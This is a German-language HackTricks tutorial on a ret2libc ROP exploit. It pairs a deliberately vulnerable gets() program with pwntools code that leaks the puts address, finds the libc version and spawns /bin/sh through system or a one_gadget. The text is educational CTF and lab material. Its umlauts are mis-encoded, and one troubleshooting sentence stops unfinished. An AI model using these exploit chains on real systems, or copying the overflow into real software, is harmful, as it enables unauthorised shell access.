# Offenlegung der libc-Adresse mit ROP

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Kurze Zusammenfassung

1. **Ermitteln** des √úberlauf-**Offsets**
2. **Finden** des `POP_RDI`-Gadgets, `PUTS_PLT` und `MAIN`-Gadgets
3. Verwenden Sie die zuvor gefundenen Gadgets, um die Speicheradresse von `puts` oder einer anderen libc-Funktion zu **leaken** und die **libc-Version zu ermitteln** ([herunterladen](https://libc.blukat.me))
4. Mit der Bibliothek **das ROP berechnen und ausnutzen**

## Weitere Tutorials und Bin√§rdateien zum √úben

Dieses Tutorial wird den im folgenden Tutorial vorgeschlagenen Code/Bin√§rdatei ausnutzen: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Weitere n√ºtzliche Tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Code

Dateiname: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - Auslaufende LIBC-Vorlage

Laden Sie das Exploit herunter und platzieren Sie es im selben Verzeichnis wie die anf√§llige Bin√§rdatei und geben Sie die ben√∂tigten Daten an das Skript:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Ermittlung des Offset

Die Vorlage ben√∂tigt einen Offset, bevor sie mit dem Exploit fortfahren kann. Wenn keiner bereitgestellt wird, f√ºhrt sie den erforderlichen Code aus, um ihn zu finden (standardm√§√üig `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**F√ºhren** Sie `python template.py` aus, es wird eine GDB-Konsole ge√∂ffnet, in der das Programm abst√ºrzt. F√ºhren Sie innerhalb dieser **GDB-Konsole** `x/wx $rsp` aus, um die **Bytes** zu erhalten, die den RIP √ºberschreiben werden. Ermitteln Sie abschlie√üend den **Offset** mithilfe einer **Python**-Konsole:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1007).png>)

Nachdem Sie den Offset gefunden haben (in diesem Fall 40), √§ndern Sie die OFFSET-Variable innerhalb der Vorlage mit diesem Wert.\
`OFFSET = "A" * 40`

Eine andere M√∂glichkeit w√§re die Verwendung von: `pattern create 1000` -- _ausf√ºhren bis ret_ -- `pattern seach $rsp` von GEF.

## 2- Finden von Gadgets

Jetzt m√ºssen wir ROP-Gadgets innerhalb des Bin√§rdatei finden. Diese ROP-Gadgets werden n√ºtzlich sein, um `puts` aufzurufen, um die verwendete **libc** zu finden, und sp√§ter um **den endg√ºltigen Exploit auszuf√ºhren**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Der `PUTS_PLT` wird ben√∂tigt, um die **Funktion puts** aufzurufen.\
Der `MAIN_PLT` wird ben√∂tigt, um die **Hauptfunktion** erneut aufzurufen, nachdem eine Interaktion stattgefunden hat, um den **√úberlauf** erneut zu **ausnutzen** (unendliche Runden der Ausnutzung). **Es wird am Ende jedes ROP verwendet, um das Programm erneut aufzurufen**.\
Das **POP\_RDI** wird ben√∂tigt, um einen **Parameter** an die aufgerufene Funktion zu **√ºbergeben**.

In diesem Schritt m√ºssen Sie nichts ausf√ºhren, da alles von pwntools w√§hrend der Ausf√ºhrung gefunden wird.

## 3- Auffinden der libc-Bibliothek

Jetzt ist es an der Zeit herauszufinden, welche Version der **libc**-Bibliothek verwendet wird. Dazu werden wir die **Adresse** im Speicher der **Funktion** `puts` **leaken** und dann werden wir **suchen**, in welcher **Bibliotheksversion** sich die puts-Version an dieser Adresse befindet.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Um dies zu tun, ist die wichtigste Zeile des ausgef√ºhrten Codes:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Dies sendet einige Bytes, bis das **√úberschreiben** des **RIP** m√∂glich ist: `OFFSET`.\
Dann wird die **Adresse** des Gadgets `POP_RDI` festgelegt, damit die n√§chste Adresse (`FUNC_GOT`) im **RDI**-Register gespeichert wird. Dies geschieht, weil wir **puts aufrufen** m√∂chten, wobei wir ihm die **Adresse** des `PUTS_GOT` √ºbergeben, da die Adresse der puts-Funktion im Speicher in der Adresse gespeichert ist, auf die `PUTS_GOT` zeigt.\
Danach wird `PUTS_PLT` aufgerufen (mit `PUTS_GOT` im **RDI**), sodass puts den Inhalt innerhalb von `PUTS_GOT` (**die Adresse der puts-Funktion im Speicher**) liest und ihn **ausgibt**.\
Schlie√ülich wird die **Hauptfunktion erneut aufgerufen**, damit wir den √úberlauf erneut ausnutzen k√∂nnen.

Auf diese Weise haben wir die puts-Funktion get√§uscht, um die **Adresse** der Funktion **puts** im **Speicher** auszugeben (die sich in der **libc**-Bibliothek befindet). Jetzt, da wir diese Adresse haben, k√∂nnen wir **herausfinden, welche libc-Version verwendet wird**.

![](<../../../../.gitbook/assets/image (1049).png>)

Da wir einige **lokale** Bin√§rdateien **ausnutzen**, ist es **nicht erforderlich**, herauszufinden, welche Version von **libc** verwendet wird (einfach die Bibliothek in `/lib/x86_64-linux-gnu/libc.so.6` finden).\
In einem Fall von Remote-Exploits werde ich hier erkl√§ren, wie Sie es finden k√∂nnen:

### 3.1- Suchen nach libc-Version (1)

Sie k√∂nnen auf der Webseite suchen, welche Bibliothek verwendet wird: [https://libc.blukat.me/](https://libc.blukat.me)\
Es erm√∂glicht Ihnen auch, die entdeckte Version von **libc** herunterzuladen.

![](<../../../../.gitbook/assets/image (221).png>)

### 3.2- Suchen nach libc-Version (2)

Sie k√∂nnen auch Folgendes tun:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Dies wird einige Zeit dauern, bitte haben Sie Geduld.\
Damit dies funktioniert, ben√∂tigen wir:

* Libc-Symbolname: `puts`
* Durchgesickerte libc-Adresse: `0x7ff629878690`

Wir k√∂nnen herausfinden, welche **libc** h√∂chstwahrscheinlich verwendet wird.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Wir haben 2 Treffer (probieren Sie den zweiten aus, wenn der erste nicht funktioniert). Laden Sie den ersten herunter:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Kopieren Sie die libc von `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` in unser Arbeitsverzeichnis.

### 3.3- Andere Funktionen zum Auslesen
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Finden basierend auf der libc-Adresse & ausnutzen

An diesem Punkt sollten wir die verwendete libc-Bibliothek kennen. Da wir eine lokale Bin√§rdatei ausnutzen, werde ich einfach verwenden: `/lib/x86_64-linux-gnu/libc.so.6`

Also, am Anfang von `template.py` √§ndern Sie die **libc** Variable zu: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it`

Indem Sie den **Pfad zur libc-Bibliothek** angeben, wird der Rest des **Exploits automatisch berechnet**.

Im `get_addr`-Funktion wird die **Basisadresse von libc** berechnet:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Beachten Sie, dass die **endg√ºltige Basisadresse von libc mit 00 enden muss**. Wenn das nicht der Fall ist, haben Sie m√∂glicherweise eine falsche Bibliothek durchgesickert.
{% endhint %}

Dann werden die Adresse der Funktion `system` und die **Adresse** des Strings _"/bin/sh"_ aus der **Basisadresse** von **libc** berechnet und unter Verwendung der **libc-Bibliothek** angegeben.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Schlie√ülich wird das Ausf√ºhrungs-Exploit f√ºr /bin/sh vorbereitet und gesendet:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Lassen Sie uns dieses letzte ROP erkl√§ren.\
Das letzte ROP (`rop1`) endete erneut mit dem Aufruf der Hauptfunktion, dann k√∂nnen wir **erneut ausnutzen** den **√úberlauf** (deshalb ist hier wieder der `OFFSET`). Dann m√∂chten wir `POP_RDI` aufrufen, der auf die **Adresse** von _"/bin/sh"_ (`BINSH`) zeigt, und die **system**-Funktion aufrufen (`SYSTEM`), da die Adresse von _"/bin/sh"_ als Parameter √ºbergeben wird.\
Schlie√ülich wird die **Adresse der exit-Funktion** aufgerufen, damit der Prozess **ordnungsgem√§√ü beendet** wird und keine Warnung generiert wird.

**Auf diese Weise wird das Exploit eine \_/bin/sh**\_\*\* Shell ausf√ºhren.\*\*

![](<../../../../.gitbook/assets/image (165).png>)

## 4(2)- Verwendung von ONE\_GADGET

Sie k√∂nnten auch [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget)verwenden, um anstelle von **system** und **"/bin/sh" eine Shell zu erhalten. **ONE\_GADGET** wird innerhalb der libc-Bibliothek einen Weg finden, um eine Shell zu erhalten, indem nur eine **ROP-Adresse** verwendet wird.\
Normalerweise gibt es jedoch einige Einschr√§nkungen, die h√§ufigsten und einfach zu vermeidenden sind wie `[rsp+0x30] == NULL`. Da Sie die Werte im **RSP** kontrollieren, m√ºssen Sie nur einige weitere NULL-Werte senden, damit die Einschr√§nkung vermieden wird.

![](<../../../../.gitbook/assets/image (754).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT DATEI

Sie k√∂nnen hier eine Vorlage finden, um diese Schwachstelle auszunutzen:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## H√§ufige Probleme

### MAIN\_PLT = elf.symbols\['main'] nicht gefunden

Wenn das Symbol "main" nicht existiert. Dann k√∂nnen Sie herausfinden, wo sich der Hauptcode befindet:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
und die Adresse manuell setzen:
```python
MAIN_PLT = 0x401080
```
### Puts nicht gefunden

Wenn das Bin√§r nicht Puts verwendet, sollten Sie √ºberpr√ºfen, ob es verwendet

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

Wenn Sie diesen **Fehler** nach Erstellung des **gesamten** Exploits finden: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Versuchen Sie, **64 Bytes von der Adresse von "/bin/sh" abzuziehen**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
